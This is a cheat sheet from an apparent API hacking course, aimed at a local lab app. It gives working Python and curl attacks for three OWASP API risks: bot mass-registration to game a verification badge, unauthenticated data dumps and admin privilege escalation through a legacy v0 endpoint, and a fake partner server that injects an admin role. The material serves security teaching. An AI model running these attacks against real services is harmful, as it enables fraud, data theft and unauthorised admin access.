# 🗂️ Cheat Sheet — Stage 8: Additional OWASP Coverage

## API6:2023 — Unrestricted Business Flows

```python
# Mass bot registration + follow + badge claim
import requests, random, string

BASE = "http://localhost:5001/api/v1"

def bot():
    u = "bot_" + "".join(random.choices(string.ascii_lowercase, k=8))
    r = requests.post(f"{BASE}/auth/register",
                       json={"username": u, "email": f"{u}@x.com", "password": "password123"})
    return r.json()["token"]

target_id = 6  # your target user id
for _ in range(5):
    t = bot()
    requests.post(f"{BASE}/users/{target_id}/follow", headers={"Authorization": f"Bearer {t}"})

requests.post(f"{BASE}/promotions/verification/apply", headers=target_headers)
```

```bash
# Endpoints
GET  /api/v1/promotions/verification/eligibility
POST /api/v1/promotions/verification/apply
POST /api/v1/promotions/verification/revoke/:user_id   (BOLA!)
```

## API9:2023 — Improper Inventory Management (Legacy API)

```bash
# Discover via debug endpoint
curl -s http://localhost:5001/api/v1/debug | jq -r '.registered_routes[]' | grep v0

# Unauthenticated dump
curl -s http://localhost:5001/api/v0/users | jq .
curl -s http://localhost:5001/api/v0/export-all | jq .

# Unauthenticated privilege escalation
curl -s -X PUT http://localhost:5001/api/v0/users/1 \
  -H "Content-Type: application/json" -d '{"role":"admin"}'
```

## API10:2023 — Unsafe Consumption of APIs

```python
# Stand up a fake partner API (localhost only)
from http.server import BaseHTTPRequestHandler, HTTPServer
import json, threading

class Evil(BaseHTTPRequestHandler):
    def do_GET(self):
        body = json.dumps({"role": "admin", "is_verified": True}).encode()
        self.send_response(200); self.send_header("Content-Type", "application/json")
        self.end_headers(); self.wfile.write(body)

threading.Thread(target=HTTPServer(("127.0.0.1", 8888), Evil).serve_forever, daemon=True).start()
```

```bash
curl -s -X POST http://localhost:5001/api/v1/integrations/import-profile \
  -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
  -d '{"source_url":"http://127.0.0.1:8888/profile.json"}'
```

## OpenAPI/Swagger Recon (Stage 3.4, reinforced here)

```bash
curl -s http://localhost:5001/openapi.json | jq '[.paths | to_entries[] | select(.value[].["x-internal"]==true) | .key]'
open http://localhost:5001/swagger
```

## Quick Diagnostic Checklist

```
[ ] Can a sensitive business action be scripted end-to-end with no human step?  → API6
[ ] Are there API versions/paths not in the root index or README?               → API9
[ ] Does any feature trust a caller-supplied external URL's response blindly?    → API10
[ ] Does /openapi.json or /swagger leak more than the documented surface?        → API9
```

---
*SocialHack API Hacking Course — Stage 8 Cheat Sheet*
